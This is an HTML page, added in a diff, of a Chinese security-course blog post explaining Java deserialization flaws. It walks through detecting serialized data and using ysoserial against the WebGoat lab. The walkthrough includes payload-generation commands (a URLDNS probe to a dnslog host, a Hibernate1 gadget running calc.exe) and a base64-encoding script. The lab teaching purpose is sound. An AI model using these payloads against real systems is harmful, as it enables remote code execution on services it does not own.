@@ -1,0 +1,230 @@
+<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0"><title>Day47 WEB攻防-通用漏洞&amp;Java反序列化&amp;EXP生成&amp;数据提取&amp;组件安全 | ai潼</title><meta name="author" content="pwy"><meta name="copyright" content="pwy"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="#知识点：1、Java反序列化演示-原生API接口 2、Java反序列化漏洞利用-Ysoserial使用 3、Java反序列化漏洞发现利用点-函数&amp;数据 4、Java反序列化考点-真实&amp;CTF赛题-审计分析 #内容点：1、明白-Java反序列化原理 2、判断-Java反序列化漏洞 3、学会-Ysoserial工具使用 4、学会-SerializationDumper 5、了解-简要">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Day47 WEB攻防-通用漏洞&amp;Java反序列化&amp;EXP生成&amp;数据提取&amp;组件安全">
+<meta property="og:url" content="http://example.com/2023/02/03/Day47-WEB%E6%94%BB%E9%98%B2-%E9%80%9A%E7%94%A8%E6%BC%8F%E6%B4%9E-Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-EXP%E7%94%9F%E6%88%90-%E6%95%B0%E6%8D%AE%E6%8F%90%E5%8F%96-%E7%BB%84%E4%BB%B6%E5%AE%89%E5%85%A8/index.html">
+<meta property="og:site_name" content="ai潼">
+<meta property="og:description" content="#知识点：1、Java反序列化演示-原生API接口 2、Java反序列化漏洞利用-Ysoserial使用 3、Java反序列化漏洞发现利用点-函数&amp;数据 4、Java反序列化考点-真实&amp;CTF赛题-审计分析 #内容点：1、明白-Java反序列化原理 2、判断-Java反序列化漏洞 3、学会-Ysoserial工具使用 4、学会-SerializationDumper 5、了解-简要">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://pic4.zhimg.com/80/80e8e3545dacbde5b49c74c8efbfd483_1440w.webp">
+<meta property="article:published_time" content="2023-02-02T17:50:28.000Z">
+<meta property="article:modified_time" content="2023-02-21T07:23:47.529Z">
+<meta property="article:author" content="pwy">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://pic4.zhimg.com/80/80e8e3545dacbde5b49c74c8efbfd483_1440w.webp"><link rel="shortcut icon" href="/img/favicon.png"><link rel="canonical" href="http://example.com/2023/02/03/Day47-WEB%E6%94%BB%E9%98%B2-%E9%80%9A%E7%94%A8%E6%BC%8F%E6%B4%9E-Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-EXP%E7%94%9F%E6%88%90-%E6%95%B0%E6%8D%AE%E6%8F%90%E5%8F%96-%E7%BB%84%E4%BB%B6%E5%AE%89%E5%85%A8/index.html"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css" media="print" onload="this.media='all'"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox.min.css" media="print" onload="this.media='all'"><script>const GLOBAL_CONFIG = { 
+  root: '/',
+  algolia: undefined,
+  localSearch: {"path":"/search.xml","preload":false,"languages":{"hits_empty":"找不到您查询的内容：${query}"}},
+  translate: undefined,
+  noticeOutdate: undefined,
+  highlight: {"plugin":"highlighjs","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false},
+  copy: {
+    success: '复制成功',
+    error: '复制错误',
+    noSupport: '浏览器不支持'
+  },
+  relativeDate: {
+    homepage: false,
+    post: false
+  },
+  runtime: '',
+  date_suffix: {
+    just: '刚刚',
+    min: '分钟前',
+    hour: '小时前',
+    day: '天前',
+    month: '个月前'
+  },
+  copyright: undefined,
+  lightbox: 'fancybox',
+  Snackbar: undefined,
+  source: {
+    justifiedGallery: {
+      js: 'https://cdn.jsdelivr.net/npm/flickr-justified-gallery/dist/fjGallery.min.js',
+      css: 'https://cdn.jsdelivr.net/npm/flickr-justified-gallery/dist/fjGallery.min.css'
+    }
+  },
+  isPhotoFigcaption: false,
+  islazyload: false,
+  isAnchor: false,
+  percent: {
+    toc: true,
+    rightside: false,
+  }
+}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
+  title: 'Day47 WEB攻防-通用漏洞&Java反序列化&EXP生成&数据提取&组件安全',
+  isPost: true,
+  isHome: false,
+  isHighlightShrink: false,
+  isToc: true,
+  postUpdate: '2023-02-21 15:23:47'
+}</script><noscript><style type="text/css">
+  #nav {
+    opacity: 1
+  }
+  .justified-gallery img {
+    opacity: 1
+  }
+
+  #recent-posts time,
+  #post-meta time {
+    display: inline !important
+  }
+</style></noscript><script>(win=>{
+    win.saveToLocal = {
+      set: function setWithExpiry(key, value, ttl) {
+        if (ttl === 0) return
+        const now = new Date()
+        const expiryDay = ttl * 86400000
+        const item = {
+          value: value,
+          expiry: now.getTime() + expiryDay,
+        }
+        localStorage.setItem(key, JSON.stringify(item))
+      },
+
+      get: function getWithExpiry(key) {
+        const itemStr = localStorage.getItem(key)
+
+        if (!itemStr) {
+          return undefined
+        }
+        const item = JSON.parse(itemStr)
+        const now = new Date()
+
+        if (now.getTime() > item.expiry) {
+          localStorage.removeItem(key)
+          return undefined
+        }
+        return item.value
+      }
+    }
+  
+    win.getScript = url => new Promise((resolve, reject) => {
+      const script = document.createElement('script')
+      script.src = url
+      script.async = true
+      script.onerror = reject
+      script.onload = script.onreadystatechange = function() {
+        const loadState = this.readyState
+        if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+        script.onload = script.onreadystatechange = null
+        resolve()
+      }
+      document.head.appendChild(script)
+    })
+  
+    win.getCSS = url => new Promise((resolve, reject) => {
+      const link = document.createElement('link')
+      link.rel = 'stylesheet'
+      link.href = url
+      link.onload = () => resolve()
+      link.onerror = () => reject()
+      document.head.appendChild(link)
+    })
+  
+      win.activateDarkMode = function () {
+        document.documentElement.setAttribute('data-theme', 'dark')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
+        }
+      }
+      win.activateLightMode = function () {
+        document.documentElement.setAttribute('data-theme', 'light')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
+        }
+      }
+      const t = saveToLocal.get('theme')
+    
+          if (t === 'dark') activateDarkMode()
+          else if (t === 'light') activateLightMode()
+        
+      const asideStatus = saveToLocal.get('aside-status')
+      if (asideStatus !== undefined) {
+        if (asideStatus === 'hide') {
+          document.documentElement.classList.add('hide-aside')
+        } else {
+          document.documentElement.classList.remove('hide-aside')
+        }
+      }
+    
+    const detectApple = () => {
+      if(/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)){
+        document.documentElement.classList.add('apple')
+      }
+    }
+    detectApple()
+    })(window)</script><meta name="generator" content="Hexo 6.3.0"><link rel="alternate" href="/atom.xml" title="ai潼" type="application/atom+xml">
+</head><body><div id="web_bg"></div><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img is-center"><img src="/img/tt.jpg" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="sidebar-site-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">12</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">0</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">1</div></a></div><hr/><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 主页</span></a></div><div class="menus_item"><a class="site-page group" href="javascript:void(0);"><i class="fa-fw fa fa-graduation-cap"></i><span> 博文</span><i class="fas fa-chevron-down"></i></a><ul class="menus_item_child"><li><a class="site-page child" href="/categories/"><i class="fa-fw fa fa-archive"></i><span> 分类</span></a></li><li><a class="site-page child" href="/tags/"><i class="fa-fw fa fa-tags"></i><span> 标签</span></a></li><li><a class="site-page child" href="/archives/"><i class="fa-fw fa fa-folder-open"></i><span> 归档</span></a></li></ul></div><div class="menus_item"><a class="site-page group" href="javascript:void(0);"><i class="fa-fw fas fa-list"></i><span> 生活</span><i class="fas fa-chevron-down"></i></a><ul class="menus_item_child"><li><a class="site-page child" href="/shuoshuo/"><i class="fa-fw fa fa-comments-o"></i><span> 分享</span></a></li><li><a class="site-page child" href="/photos/"><i class="fa-fw fa fa-camera-retro"></i><span> 相册</span></a></li><li><a class="site-page child" href="/music/"><i class="fa-fw fa fa-music"></i><span> 音乐</span></a></li><li><a class="site-page child" href="/movies/"><i class="fa-fw fas fa-video"></i><span> 影视</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="/links/"><i class="fa-fw fa fa-link"></i><span> 友链</span></a></div><div class="menus_item"><a class="site-page" href="/comment/"><i class="fa-fw fa fa-paper-plane"></i><span> 留言板</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> 关于笔者</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url('https://pic4.zhimg.com/80/80e8e3545dacbde5b49c74c8efbfd483_1440w.webp')"><nav id="nav"><span id="blog-info"><a href="/" title="ai潼"><span class="site-name">ai潼</span></a></span><div id="menus"><div id="search-button"><a class="site-page social-icon search" href="javascript:void(0);"><i class="fas fa-search fa-fw"></i><span> 搜索</span></a></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 主页</span></a></div><div class="menus_item"><a class="site-page group" href="javascript:void(0);"><i class="fa-fw fa fa-graduation-cap"></i><span> 博文</span><i class="fas fa-chevron-down"></i></a><ul class="menus_item_child"><li><a class="site-page child" href="/categories/"><i class="fa-fw fa fa-archive"></i><span> 分类</span></a></li><li><a class="site-page child" href="/tags/"><i class="fa-fw fa fa-tags"></i><span> 标签</span></a></li><li><a class="site-page child" href="/archives/"><i class="fa-fw fa fa-folder-open"></i><span> 归档</span></a></li></ul></div><div class="menus_item"><a class="site-page group" href="javascript:void(0);"><i class="fa-fw fas fa-list"></i><span> 生活</span><i class="fas fa-chevron-down"></i></a><ul class="menus_item_child"><li><a class="site-page child" href="/shuoshuo/"><i class="fa-fw fa fa-comments-o"></i><span> 分享</span></a></li><li><a class="site-page child" href="/photos/"><i class="fa-fw fa fa-camera-retro"></i><span> 相册</span></a></li><li><a class="site-page child" href="/music/"><i class="fa-fw fa fa-music"></i><span> 音乐</span></a></li><li><a class="site-page child" href="/movies/"><i class="fa-fw fas fa-video"></i><span> 影视</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="/links/"><i class="fa-fw fa fa-link"></i><span> 友链</span></a></div><div class="menus_item"><a class="site-page" href="/comment/"><i class="fa-fw fa fa-paper-plane"></i><span> 留言板</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> 关于笔者</span></a></div></div><div id="toggle-menu"><a class="site-page" href="javascript:void(0);"><i class="fas fa-bars fa-fw"></i></a></div></div></nav><div id="post-info"><h1 class="post-title">Day47 WEB攻防-通用漏洞&amp;Java反序列化&amp;EXP生成&amp;数据提取&amp;组件安全</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2023-02-02T17:50:28.000Z" title="发表于 2023-02-03 01:50:28">2023-02-03</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2023-02-21T07:23:47.529Z" title="更新于 2023-02-21 15:23:47">2023-02-21</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/Web%E6%94%BB%E9%98%B2/">Web攻防</a></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title="Day47 WEB攻防-通用漏洞&amp;Java反序列化&amp;EXP生成&amp;数据提取&amp;组件安全"><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">阅读量:</span><span id="busuanzi_value_page_pv"><i class="fa-solid fa-spinner fa-spin"></i></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container"><h3 id="知识点："><a href="#知识点：" class="headerlink" title="#知识点："></a>#知识点：</h3><p>1、Java反序列化演示-原生API接口</p>
+<p>2、Java反序列化漏洞利用-Ysoserial使用</p>
+<p>3、Java反序列化漏洞发现利用点-函数&amp;数据</p>
+<p>4、Java反序列化考点-真实&amp;CTF赛题-审计分析</p>
+<h3 id="内容点："><a href="#内容点：" class="headerlink" title="#内容点："></a>#内容点：</h3><p>1、明白-Java反序列化原理</p>
+<p>2、判断-Java反序列化漏洞</p>
+<p>3、学会-Ysoserial工具使用</p>
+<p>4、学会-SerializationDumper</p>
+<p>5、了解-简要Java代码审计分析</p>
+<h3 id="前置知识"><a href="#前置知识" class="headerlink" title="#前置知识:"></a>#前置知识:</h3><h4 id="序列化和反序列化的概念："><a href="#序列化和反序列化的概念：" class="headerlink" title="序列化和反序列化的概念："></a>序列化和反序列化的概念：</h4><p>序列化：把Java对象转换为字节序列的过程。</p>
+<p>反序列化：把字节序列恢复为Java对象的过程。</p>
+<p>对象的序列化主要有两种用途：</p>
+<p>把对象的字节序列永久地保存到硬盘上，通常存放在一个文件中；（持久化对象）</p>
+<p>在网络上传送对象的字节序列。（网络传输对象）</p>
+<h4 id="函数接口："><a href="#函数接口：" class="headerlink" title="函数接口："></a>函数接口：</h4><p>Java： Serializable Externalizable接口、fastjson、jackson、gson、ObjectInputStream.read、ObjectObjectInputStream.readUnshared、XMLDecoder.read、ObjectYaml.loadXStream.fromXML、ObjectMapper.readValue、JSON.parseObject等</p>
+<p>PHP： serialize()、 unserialize() </p>
+<p>Python：pickle</p>
+<h4 id="数据出现："><a href="#数据出现：" class="headerlink" title="数据出现："></a>数据出现：</h4><p>1、功能特性：</p>
+<p>反序列化操作一般应用在导入模板文件、网络通信、数据传输、日志格式化存储、对象数据落磁盘、或DB存储等业务场景。因此审计过程中重点关注这些功能板块。</p>
+<p>2、数据特性：</p>
+<p>一段数据以<strong>rO0AB</strong>开头，你基本可以确定这串就是JAVA序列化base64加密的数据。</p>
+<p>或者如果以<strong>aced</strong>开头，那么他就是这一段java序列化的16进制。</p>
+<p>3、出现具体：</p>
+<p>http参数，cookie，sesion，存储方式可能是base64(rO0），压缩后的base64(H4s),MII等Servlets http,Sockets,Session管理器，包含的协议就包括：JMX,RMI,JMS,JND1等(\xac\Xed) xm lXstream,XmldEcoder等（http Body:Content-type: application&#x2F;xml）json(jackson,fastjson)http请求中包含</p>
+<h4 id="发现："><a href="#发现：" class="headerlink" title="-发现："></a>-发现：</h4><p>黑盒分析：数据库出现地-观察数据特性</p>
+<p>白盒分析：组件安全&amp;函数搜索&amp;功能模块</p>
+<h4 id="利用："><a href="#利用：" class="headerlink" title="-利用："></a>-利用：</h4><p>Ysoserial集成的jar包配合生成，特性的专业漏洞利用工具等</p>
+<h3 id="演示案例："><a href="#演示案例：" class="headerlink" title="演示案例："></a>演示案例：</h3><p>➢ 原生API-Ysoserial_URLDNS使用</p>
+<p>➢ 三方组件-Ysoserial_支持库生成使用</p>
+<p>➢ 解密分析-SerializationDumper数据分析</p>
+<p>➢ CTF赛题-[网鼎杯2020朱雀组]ThinkJava</p>
+<h3 id="复现："><a href="#复现：" class="headerlink" title="复现："></a>复现：</h3><h5 id="➢-原生API-Ysoserial-URLDNS使用"><a href="#➢-原生API-Ysoserial-URLDNS使用" class="headerlink" title="➢ 原生API-Ysoserial_URLDNS使用"></a>➢ 原生API-Ysoserial_URLDNS使用</h5><p>在dnslog生成url测试dns连接：</p>
+<p>没组件生成DNS利用：</p>
+<blockquote>
+<p>java -jar ysoserial-0.0.6-SNAPSHOT-all.jar URLDNS “<a target="_blank" rel="noopener" href="http://5csix6.dnslog.cn/">http://5csix6.dnslog.cn</a>“ &gt; a.bin</p>
+</blockquote>
+<p><img src="/../images/Day47-WEB%E6%94%BB%E9%98%B2-%E9%80%9A%E7%94%A8%E6%BC%8F%E6%B4%9E-Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-EXP%E7%94%9F%E6%88%90-%E6%95%B0%E6%8D%AE%E6%8F%90%E5%8F%96-%E7%BB%84%E4%BB%B6%E5%AE%89%E5%85%A8/image-20230221130153008.png" alt="image-20230221130153008"></p>
+<p>复制粘贴base64编码后的内容：</p>
+<p><img src="/../images/Day47-WEB%E6%94%BB%E9%98%B2-%E9%80%9A%E7%94%A8%E6%BC%8F%E6%B4%9E-Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-EXP%E7%94%9F%E6%88%90-%E6%95%B0%E6%8D%AE%E6%8F%90%E5%8F%96-%E7%BB%84%E4%BB%B6%E5%AE%89%E5%85%A8/image-20230221130459043.png" alt="image-20230221130459043"></p>
+<p>发现有回显：</p>
+<p><img src="/../images/Day47-WEB%E6%94%BB%E9%98%B2-%E9%80%9A%E7%94%A8%E6%BC%8F%E6%B4%9E-Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-EXP%E7%94%9F%E6%88%90-%E6%95%B0%E6%8D%AE%E6%8F%90%E5%8F%96-%E7%BB%84%E4%BB%B6%E5%AE%89%E5%85%A8/image-20230221130416891.png" alt="image-20230221130416891"></p>
+<h5 id="➢-三方组件-Ysoserial-支持库生成使用"><a href="#➢-三方组件-Ysoserial-支持库生成使用" class="headerlink" title="➢ 三方组件-Ysoserial_支持库生成使用"></a>➢ 三方组件-Ysoserial_支持库生成使用</h5><h6 id="分析漏洞："><a href="#分析漏洞：" class="headerlink" title="分析漏洞："></a>分析漏洞：</h6><p>靶场webgoat—Insecure Deserializetion—5</p>
+<p>题目给的数据是rO0AB开头，所以是经过了base64加密的java序列化对象。</p>
+<p><img src="/../images/Day47-WEB%E6%94%BB%E9%98%B2-%E9%80%9A%E7%94%A8%E6%BC%8F%E6%B4%9E-Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-EXP%E7%94%9F%E6%88%90-%E6%95%B0%E6%8D%AE%E6%8F%90%E5%8F%96-%E7%BB%84%E4%BB%B6%E5%AE%89%E5%85%A8/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAaW165Li2,size_20,color_FFFFFF,t_70,g_se,x_16.png" alt="img"></p>
+<p> 解码后是一段英文，百度翻译也没发现有啥用处：</p>
+<p><img src="/../images/Day47-WEB%E6%94%BB%E9%98%B2-%E9%80%9A%E7%94%A8%E6%BC%8F%E6%B4%9E-Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-EXP%E7%94%9F%E6%88%90-%E6%95%B0%E6%8D%AE%E6%8F%90%E5%8F%96-%E7%BB%84%E4%BB%B6%E5%AE%89%E5%85%A8/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAaW165Li2,size_20,color_FFFFFF,t_70,g_se,x_16-16769497958759.png" alt="img"></p>
+<p>题目还给出了一个接收序列化数据的表单，先分析一波：</p>
+<p>用burpsuite抓包：</p>
+<p> <img src="https://img-blog.csdnimg.cn/022a10fc96ac48dbac308d45bc3b5c9e.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAaW165Li2,size_20,color_FFFFFF,t_70,g_se,x_16" alt="img"></p>
+<p> 可以看到，表单提交的数据通过token接收，并发送到&#x2F;InsecureDeserialization&#x2F;task这个页面，可以通过&#x2F;InsecureDeserialization&#x2F;task找出对应的源码，所以，页面接收的token是一段经过base64编码的序列化数据</p>
+<p><img src="/../images/Day47-WEB%E6%94%BB%E9%98%B2-%E9%80%9A%E7%94%A8%E6%BC%8F%E6%B4%9E-Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-EXP%E7%94%9F%E6%88%90-%E6%95%B0%E6%8D%AE%E6%8F%90%E5%8F%96-%E7%BB%84%E4%BB%B6%E5%AE%89%E5%85%A8/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAaW165Li2,size_20,color_FFFFFF,t_70,g_se,x_16-167694992761215.png" alt="img"></p>
+<h6 id="利用漏洞：—-ysoserial工具"><a href="#利用漏洞：—-ysoserial工具" class="headerlink" title="利用漏洞：—-ysoserial工具"></a>利用漏洞：—-ysoserial工具</h6><p>找到了传输序列化数据的接口，接下来就需要构造payload了</p>
+<p>首先肯定是查找已知漏洞的利用，对于分析代码去构造payload，没技术不说，也没时间去搞，最简单最直接就是找披露过的java插件漏洞。</p>
+<p>运行ysoserial工具</p>
+<p>java -jar ysoserial.jar</p>
+<p><img src="/../images/Day47-WEB%E6%94%BB%E9%98%B2-%E9%80%9A%E7%94%A8%E6%BC%8F%E6%B4%9E-Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-EXP%E7%94%9F%E6%88%90-%E6%95%B0%E6%8D%AE%E6%8F%90%E5%8F%96-%E7%BB%84%E4%BB%B6%E5%AE%89%E5%85%A8/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAaW165Li2,size_20,color_FFFFFF,t_70,g_se,x_16-167694999310318.png" alt="img"></p>
+<p>按照ysoserial支持的插件，查找webgoat是否安装了对应的jar包，这里只有两个：</p>
+<p>Hibernate和spring-core 但是spring-core的版本不一致，所以就选择Hibernate</p>
+<p><img src="/../images/Day47-WEB%E6%94%BB%E9%98%B2-%E9%80%9A%E7%94%A8%E6%BC%8F%E6%B4%9E-Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-EXP%E7%94%9F%E6%88%90-%E6%95%B0%E6%8D%AE%E6%8F%90%E5%8F%96-%E7%BB%84%E4%BB%B6%E5%AE%89%E5%85%A8/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAaW165Li2,size_20,color_FFFFFF,t_70,g_se,x_16-167695000829021.png" alt="img"></p>
+<p>将Hibernate的jar包复制到ysoserial工具的目录下，jar包名字中必须是有core的，是插件的核心</p>
+<p> 我这里是hibernate-core-5.4.6.Final.jar这个包，利用ysoserial生成payload，执行以下命令</p>
+<blockquote>
+<p> java -Dhibernate5 -cp hibernate-core-5.4.6.Final.jar;ysoserial.jar ysoserial.GeneratePayload Hibernate1 calc.exe &gt; token.bin</p>
+</blockquote>
+<p> java -Dhibernate5 -cp hibernate-core-5.4.6.Final.jar;  &#x2F;&#x2F;表示hibernate5的插件</p>
+<p>ysoserial.jar ysoserial.GeneratePayload Hibernate1 calc.exe &gt; token.bin  &#x2F;&#x2F;生成Hibernate1插件反序列化漏洞的payload，执行calc.exe命令，将payload保存在token.bin文件中</p>
+<p>payload生成了，但是表单接收的是经过base64编码的：采用python写的简单脚本对payloadbase64编码</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line">filename = <span class="built_in">input</span>(<span class="string">&quot;输入需要base64编码的文件名：&quot;</span>)</span><br><span class="line">s = <span class="built_in">open</span>(filename, <span class="string">&quot;rb&quot;</span>).read() <span class="comment">#文本默认模式读取文件内容rt</span></span><br><span class="line">base64_str = base64.urlsafe_b64encode(s)</span><br><span class="line"><span class="comment">#文本默认模式写入文件内容wt</span></span><br><span class="line"><span class="built_in">open</span>(<span class="string">&quot;base64.txt&quot;</span>, <span class="string">&quot;wt&quot;</span>,encoding=<span class="string">&quot;utf-8&quot;</span>).write(base64_str.decode())</span><br></pre></td></tr></table></figure>
+
+<p><img src="/../images/Day47-WEB%E6%94%BB%E9%98%B2-%E9%80%9A%E7%94%A8%E6%BC%8F%E6%B4%9E-Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-EXP%E7%94%9F%E6%88%90-%E6%95%B0%E6%8D%AE%E6%8F%90%E5%8F%96-%E7%BB%84%E4%BB%B6%E5%AE%89%E5%85%A8/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAaW165Li2,size_20,color_FFFFFF,t_70,g_se,x_16-167695018053324.png" alt="img"></p>
+<p>将编码的字符串提交：成功执行calc.exe命令</p>
+<p><img src="/../images/Day47-WEB%E6%94%BB%E9%98%B2-%E9%80%9A%E7%94%A8%E6%BC%8F%E6%B4%9E-Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-EXP%E7%94%9F%E6%88%90-%E6%95%B0%E6%8D%AE%E6%8F%90%E5%8F%96-%E7%BB%84%E4%BB%B6%E5%AE%89%E5%85%A8/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAaW165Li2,size_20,color_FFFFFF,t_70,g_se,x_16-167695019540927.png" alt="img"></p>
+</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta">文章作者: </span><span class="post-copyright-info"><a href="http://example.com">pwy</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta">文章链接: </span><span class="post-copyright-info"><a href="http://example.com/2023/02/03/Day47-WEB%E6%94%BB%E9%98%B2-%E9%80%9A%E7%94%A8%E6%BC%8F%E6%B4%9E-Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-EXP%E7%94%9F%E6%88%90-%E6%95%B0%E6%8D%AE%E6%8F%90%E5%8F%96-%E7%BB%84%E4%BB%B6%E5%AE%89%E5%85%A8/">http://example.com/2023/02/03/Day47-WEB攻防-通用漏洞-Java反序列化-EXP生成-数据提取-组件安全/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta">版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来自 <a href="http://example.com" target="_blank">ai潼</a>！</span></div></div><div class="tag_share"><div class="post-meta__tag-list"></div><div class="post_share"><div class="social-share" data-image="https://pic4.zhimg.com/80/80e8e3545dacbde5b49c74c8efbfd483_1440w.webp" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><div class="prev-post pull-left"><a href="/2023/02/03/Day48-WEB%E6%94%BB%E9%98%B2-%E9%80%9A%E7%94%A8%E6%BC%8F%E6%B4%9E-Py%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-%E9%93%BE%E6%9E%84%E9%80%A0-%E8%87%AA%E5%8A%A8%E5%AE%A1%E8%AE%A1bandit-%E9%AD%94%E6%9C%AF%E6%96%B9%E6%B3%95/" title="Day48 WEB攻防-通用漏洞&amp;Py反序列化&amp;链构造&amp;自动审计bandit&amp;魔术方法"><img class="cover" src="https://pic4.zhimg.com/80/v2-af80b26c6bd5a71eba219eb1e10b579b_1440w.webp" onerror="onerror=null;src='/img/404.jpg'" alt="cover of previous post"><div class="pagination-info"><div class="label">上一篇</div><div class="prev_info">Day48 WEB攻防-通用漏洞&amp;Py反序列化&amp;链构造&amp;自动审计bandit&amp;魔术方法</div></div></a></div><div class="next-post pull-right"><a href="/2023/02/03/Day46-WEB%E6%94%BB%E9%98%B2-%E9%80%9A%E7%94%A8%E6%BC%8F%E6%B4%9E-PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-%E5%8E%9F%E7%94%9F%E7%B1%BB-%E6%BC%8F%E6%B4%9E%E7%BB%95%E8%BF%87-%E5%85%AC%E7%A7%81%E6%9C%89%E5%B1%9E%E6%80%A7/" title="Day46 WEB攻防-通用漏洞&amp;PHP反序列化&amp;原生类&amp;漏洞绕过&amp;公私有属性"><img class="cover" src="https://pic4.zhimg.com/80/c380ba809ac2a91f827893f3cc251f7f_1440w.webp" onerror="onerror=null;src='/img/404.jpg'" alt="cover of next post"><div class="pagination-info"><div class="label">下一篇</div><div class="next_info">Day46 WEB攻防-通用漏洞&amp;PHP反序列化&amp;原生类&amp;漏洞绕过&amp;公私有属性</div></div></a></div></nav></div><div class="aside-content" id="aside-content"><div class="card-widget card-info"><div class="is-center"><div class="avatar-img"><img src="/img/tt.jpg" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info__name">pwy</div><div class="author-info__description">自律+上进+野心+机遇=成功！</div></div><div class="card-info-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">12</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">0</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">1</div></a></div><a id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/xxxxxx"><i class="fab fa-github"></i><span>Follow Me</span></a></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn fa-shake"></i><span>公告</span></div><div class="announcement_content">This is my Blog</div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>目录</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%9F%A5%E8%AF%86%E7%82%B9%EF%BC%9A"><span class="toc-number">1.</span> <span class="toc-text">#知识点：</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%86%85%E5%AE%B9%E7%82%B9%EF%BC%9A"><span class="toc-number">2.</span> <span class="toc-text">#内容点：</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" 